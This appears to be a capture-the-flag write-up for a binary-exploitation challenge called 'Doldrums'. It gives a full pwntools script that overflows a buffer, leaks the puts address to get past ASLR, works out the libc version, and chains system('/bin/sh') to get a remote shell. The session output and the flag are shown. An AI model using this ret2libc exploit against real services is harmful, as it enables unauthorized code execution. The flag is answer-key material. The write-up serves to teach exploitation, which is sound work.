# Doldrums
Without wind, no ship can sail.

This one is really secure. I promise!

```
nc 46.101.107.117 2113
```

Get a shell and read the flag.

[doldrums](doldrums)

---

This time the binary is different:
```
$ file
doldrums: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d035ad0d34a664be7426cd2196a55c38438e19cc, stripped
```

I took the exact same approach as in [Sailor's Knot](../../level7/sailors-knot/README.md) (_which was
an overkill back then but a proper solution for this one_).

Here is my Python script:
```python
from pwn import *

elf = ELF("doldrums")
rop = ROP(elf)

# First ROP payload to get current puts address (for bypassing ASLR)
rop.call("puts", [elf.got["puts"]])
rop.raw(b"\xe6\x85\x04\x08")  # Main method
print(rop.dump())

# p = elf.process()  # Local testing
p = remote("46.101.107.117", 2113)

p.recvuntil("\n")
p.recvuntil("\n")
p.sendline(b'A' * 13 + rop.chain())
p.recvuntil("Ancient_Mariner\n")
p.recvuntil("\n")

puts_address = u32(p.recvuntil("\n")[:4].ljust(4, b"\x00"))  # put address (first 4 bytes)
print("remote puts address: " + hex(puts_address))  # Address changes with each run (ASLR)

# 'put' address always ends with 460 (ASLR doesn't change last 3 values because of paging)
# we can do the same exercise for 'gets', the address always ends with be0
# using https://libc.blukat.me/ we can determine the exact libc version which is libc6-i386_2.27-3ubuntu1.4_amd64.so

# libc = ELF("libc6_2.31-3_amd64.so")  # Local testing
libc = ELF("libc6-i386_2.27-3ubuntu1.4_amd64.so")

# Set libc base address (current puts address - libc puts offset, 0x067460 in this version)
libc.address = puts_address - libc.symbols["puts"]
print("libc base address: " + hex(libc.address))

# Second payload to get a remote shell
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
print(rop.dump())

p.sendline(b'A' * 13 + rop.chain())
p.interactive()
```

It outputs:
```
...
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
challenge3
flag
heading
ynetd
$ cat flag
he2021{1nsp3ktorr_g4dg3t}
```

The flag is `he2021{1nsp3ktorr_g4dg3t}`